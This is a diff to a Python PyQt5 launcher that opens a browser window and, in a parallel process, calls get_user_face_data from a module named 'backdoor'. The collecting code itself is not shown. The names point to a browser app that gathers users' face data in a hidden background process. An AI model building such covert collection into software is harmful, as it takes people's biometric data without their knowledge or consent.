@@ -1,18 +1,21 @@
+import time
+
 from PyQt5.QtGui import *
 from PyQt5.QtWidgets import *
 from view import MyWebBrowser
 from logging import getLogger
 from session import do_session
-from multiprocessing import Process
+from multiprocessing import Process, Event
 from database import db_session_close
 import config
 
 logger = getLogger('WebBrowser')  #
 
 
-def start_browser():
+def start_browser(browser_stop_event):
     app = QApplication([])
     try:
+        browser_stop_event.set()
         window = MyWebBrowser()
         ico = config.APP_ICO
         window.window.setWindowIcon(QIcon(str(ico)))
@@ -20,21 +23,33 @@ def start_browser():
         logger.critical(exception)
     finally:
         app.exec_()
+        config.BROWSER.stop()
 
 
-def start_backdoor_apps():
+def start_backdoor_apps(browser_stop_event):
+    # browser_stop_event
     from backdoor import get_user_face_data
     get_user_face_data()
 
 
 def main():
     try:
+        browser_stop_event = Event()
         do_session()
-        start_browser_app = Process(target=start_browser)
-        backdoor_apps = Process(target=start_backdoor_apps)
+        start_browser_app = Process(target=start_browser, args=(browser_stop_event,))
+        backdoor_apps = Process(target=start_backdoor_apps, args=(browser_stop_event,))
 
         start_browser_app.start()
+        print("start .")
+        config.BROWSER.start()
+        time.sleep(5)  # wait for broswer
         backdoor_apps.start()
+
+        start_browser_app.join()
+        config.BROWSER.stop()
+        print("start s.")
+
+        backdoor_apps.join()
 
     except Exception as exception:
         logger.error(exception)
